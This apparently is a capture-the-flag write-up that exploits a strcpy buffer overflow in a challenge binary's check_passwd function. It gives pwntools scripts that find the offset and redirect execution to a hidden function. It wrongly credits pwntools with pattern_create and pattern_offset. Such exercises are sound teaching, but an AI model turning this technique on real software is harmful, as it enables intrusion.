@@ -1,0 +1,85 @@
+To solve this challenge using pwntools, we need to exploit the `check_passwd` function, which has a buffer overflow vulnerability. The `strcpy` function in `check_passwd` does not check the length of the input, allowing us to overwrite the return address on the stack.
+
+Here are the steps and the corresponding code to exploit this vulnerability:
+
+### Steps:
+1. **Identify the Vulnerability**: The `strcpy` function in `check_passwd` is vulnerable to a buffer overflow because it copies user input into a fixed-size buffer without checking the length.
+2. **Find the Offset**: Determine the exact offset at which the return address is overwritten.
+3. **Craft the Payload**: Create a payload that overwrites the return address with the address of the `what_is_this` function.
+4. **Exploit the Binary**: Use pwntools to send the crafted payload to the binary and get the flag.
+
+### Code:
+```python
+from pwn import *
+
+# Set up the process
+binary_path = './int'
+elf = ELF(binary_path)
+p = process(binary_path)
+
+# Find the offset
+context.log_level = 'debug'  # For debugging purposes
+offset = cyclic_find(0x6161616a)  # This value should be determined by running the binary with a cyclic pattern
+
+# Addresses
+what_is_this_addr = elf.symbols['what_is_this']
+
+# Craft the payload
+payload = b''
+payload += b'A' * offset  # Padding to reach the return address
+payload += p32(what_is_this_addr)  # Overwrite the return address with the address of what_is_this
+
+# Send the payload
+p.sendlineafter(b'Your choice:', b'1')  # Choose login
+p.sendlineafter(b'Please input your username:', b'user')  # Input username
+p.sendlineafter(b'Please input your passwd:', payload)  # Input password with the payload
+
+# Receive the flag
+p.interactive()
+```
+
+### Explanation:
+1. **Set up the Process**:
+   - Load the binary using `ELF`.
+   - Start the process using `process`.
+
+2. **Find the Offset**:
+   - Use `cyclic_find` to determine the offset where the return address is overwritten. You can find this value by running the binary with a cyclic pattern and examining the crash.
+
+3. **Craft the Payload**:
+   - Create a payload that consists of padding to reach the return address and then the address of the `what_is_this` function.
+
+4. **Send the Payload**:
+   - Use `sendlineafter` to interact with the binary and send the payload at the appropriate prompts.
+
+5. **Receive the Flag**:
+   - Use `interactive` to interact with the process and receive the flag.
+
+### Notes:
+- **Offset Calculation**: You need to run the binary with a cyclic pattern to determine the exact offset. You can use `pattern_create` and `pattern_offset` from pwntools to help with this.
+- **Address of `what_is_this`**: Ensure you have the correct address of the `what_is_this` function. You can use `elf.symbols` to get the address.
+
+### Example of Finding the Offset:
+```python
+from pwn import *
+
+binary_path = './int'
+elf = ELF(binary_path)
+p = process(binary_path)
+
+# Generate a cyclic pattern
+pattern = cyclic(100)
+p.sendlineafter(b'Your choice:', b'1')
+p.sendlineafter(b'Please input your username:', b'user')
+p.sendlineafter(b'Please input your passwd:', pattern)
+
+# Wait for the process to crash and get the core dump
+p.wait()
+
+# Analyze the core dump to find the offset
+core = Coredump('./core')
+offset = cyclic_find(core.read(core.eip, 4))
+print(f'Offset: {offset}')
+```
+
+Run this script to find the offset, and then use that value in the main exploit script.
